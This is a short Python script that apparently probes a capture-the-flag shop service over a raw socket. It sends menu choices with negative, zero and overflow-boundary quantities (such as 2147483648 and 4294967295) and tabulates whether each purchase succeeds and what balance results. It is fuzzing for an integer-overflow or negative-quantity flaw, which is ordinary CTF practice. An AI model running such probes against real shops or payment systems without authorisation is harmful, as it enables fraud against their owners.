import socket
import re
import time
import sys

def strip_ansi(text):
    return re.sub(r'\x1b\[([0-9,;]*[mGKH])', '', text)

def test_case(choice, qty):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect(('challs.insec.club', 40002))
        
        # Read menu
        data = b""
        start_time = time.time()
        while time.time() - start_time < 0.5:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
            except socket.timeout:
                break
        
        # Send choice
        s.sendall(f"{choice}\n".encode())
        time.sleep(0.1)
        
        # Send quantity
        s.sendall(f"{qty}\n".encode())
        
        # Read response
        resp = b""
        start_time = time.time()
        while time.time() - start_time < 0.6:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
            except socket.timeout:
                break
        s.close()
        
        full_text = strip_ansi(resp.decode('utf-8', errors='ignore'))
        success = "Purchase successful" in full_text
        
        balance = "N/A"
        match = re.search(r"Balance:\s*(\d+)", full_text)
        if match:
            balance = match.group(1)
            
        return success, balance
    except Exception as e:
        return False, str(e)

test_cases = [
    (1,1),(1,0),(1,-1),(1,-2),(1,2147483647),(1,2147483648),(1,4294967295),(1,999999999),(1,250000000),
    (4,1000000),(4,2147483647),(5,1),(5,0),(5,-1),(6,0),(0,1),(7,1),(-1,1)
]

print(f"{'Choice':>6} | {'Qty':>12} | {'Success':>10} | {'Balance':>12}")
print("-" * 50)
for choice, qty in test_cases:
    success, balance = test_case(choice, qty)
    print(f"{choice:6} | {qty:12} | {str(success):10} | {balance:12}")
